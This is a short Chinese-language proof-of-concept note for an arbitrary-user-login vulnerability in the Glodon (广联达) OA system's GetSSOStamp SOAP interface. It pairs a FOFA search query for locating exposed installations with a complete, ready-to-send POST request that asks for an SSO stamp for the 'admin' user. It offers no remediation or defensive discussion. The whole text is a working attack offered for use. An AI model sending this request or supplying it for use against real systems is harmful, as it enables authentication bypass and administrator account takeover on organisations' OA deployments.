# 广联达OA系统GetSSOStamp接口存在任意用户登录



## fofa

```java
header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
```

## poc

```java
POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
Host:
Accept: */* Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: text/xml; charset=utf-8
Content-Length: 350
SOAPAction: "http://tempuri.org/GetStamp" 

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetStamp xmlns="http://tempuri.org/">
<usercode>
admin</usercode>
</GetStamp>
</soap:Body>
</soap:Envelope>
```

